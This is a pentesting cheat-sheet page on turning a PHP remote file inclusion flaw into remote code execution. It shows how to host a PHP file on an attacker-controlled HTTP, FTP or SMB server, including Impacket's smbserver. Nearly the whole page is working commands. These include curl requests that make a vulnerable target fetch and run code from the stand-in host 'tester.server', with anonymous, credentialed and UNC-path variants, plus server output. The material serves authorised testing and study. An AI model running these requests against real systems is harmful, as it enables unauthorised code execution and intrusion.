# RFI to RCE

## via HTTP

The tester can host an arbitrary PHP code and access it through the **HTTP** protocol

```bash
# Create phpinfo.php
echo '<?php phpinfo(); ?>' > phpinfo.php

# Start a web server
python3 -m http.server 80

# Exploit the RFI to fetch the remote phpinfo.php file
curl '$URL/?parameter=http://tester.server/phpinfo.php'
```

## via FTP

The tester can also host his arbitrary PHP code and access it through the **FTP** protocol. He can use the python library **pyftpdlib** to start a FTP server.

```bash
# Start FTP server
sudo python3 -m pyftpdlib -p 21                                                                                                                                            1 ↵ alex@ubuntu
[I 2022-07-11 00:04:26] concurrency model: async
[I 2022-07-11 00:04:26] masquerade (NAT) address: None
[I 2022-07-11 00:04:26] passive ports: None
[I 2022-07-11 00:04:26] >>> starting FTP server on 0.0.0.0:21, pid=176948 <<<

# Exploit the RFI to fetch the remote phpinfo.php file
curl '$URL/?parameter=ftp://tester.server/phpinfo.php'
```

{% hint style="info" %}
PHP uses the **anonymous** credentials to authenticate to the FTP server. If the tester needs to use custom credentials, he can authenticate as follows :

<mark style="color:blue;">`curl '$URL/?parameter=ftp://user:pass@tester.server/phpinfo.php'`</mark>
{% endhint %}

## via SMB

Sometimes, the vulnerable web application is hosted on a **Windows Server,** meaning the attacker could log into a **SMB Server** to store the arbitrary PHP code.

[Impacket](https://github.com/SecureAuthCorp/impacket)'s [smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) (Python) script can be used on the attacker-controlled machine to create a SMB Server.

```
sudo python3 smbserver.py -smb2support share $(pwd)                                                                                        130 ↵ alex@ubuntu
Impacket v0.10.1.dev1 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

The PHP script can then be included by using a [UNC](https://en.wikipedia.org/wiki/Universal\_Naming\_Convention) Path.

```bash
curl '$URL/?parameter=\\tester.server\phpinfo.php'
```
